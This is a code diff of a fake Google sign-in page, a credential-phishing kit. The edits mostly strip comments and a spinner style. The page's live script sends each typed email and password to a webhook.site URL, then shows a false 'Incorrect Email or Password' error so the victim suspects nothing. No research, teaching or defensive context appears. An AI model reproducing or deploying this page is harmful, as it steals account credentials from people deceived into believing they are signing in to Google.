@@ -93,23 +93,6 @@
             min-height: 20px;
             font-weight: 500;
         }
-        /* Spinner class kept but hidden by default */
-        .loader {
-            display: none; 
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1a73e8;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-left: 10px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
         .footer {
             clear: both;
             margin-top: 40px;
@@ -130,7 +113,6 @@
 
 <div class="login-container">
     <div class="logo">
-        <!-- Google Logo SVG -->
         <svg viewBox="0 0 24 24" style="width: 75px; height: 24px;">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.58-2.38 4.09-6.22 4.09-10.09z" fill="#4285F4"></path>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"></path>
@@ -143,7 +125,6 @@
     <p>Use your Google Account</p>
 
     <form id="loginForm">
-        <!-- Single Step Form -->
         <div class="input-group">
             <label for="email">Email or phone</label>
             <input type="email" id="email" required autocomplete="off" placeholder="Enter your email">
@@ -170,16 +151,14 @@
 </div>
 
 <script>
-    // YOUR SPECIFIC WEBHOOK ID
+    // YOUR WEBHOOK ID
     const WEBHOOK_URL = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603"; 
 
-    // DOM Elements
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
     const passInput = document.getElementById('password');
     const errorMsg = document.getElementById('error-message');
 
-    // Toggle Password Visibility
     function togglePassword() {
         if (passInput.type === "password") {
             passInput.type = "text";
@@ -188,7 +167,6 @@
         }
     }
 
-    // Handle Form Submission
     form.addEventListener('submit', (e) => {
         e.preventDefault();
         
@@ -200,13 +178,8 @@
             return;
         }
 
-        // Send Data to Webhook Immediately
         sendToWebhook(email, password, "Login Attempt");
-
-        // Show Error Message (Fake Google behavior)
         errorMsg.textContent = "Incorrect Email or Password. Please try again";
-        
-        // Optional: Clear password field
         passInput.value = '';
     });
 
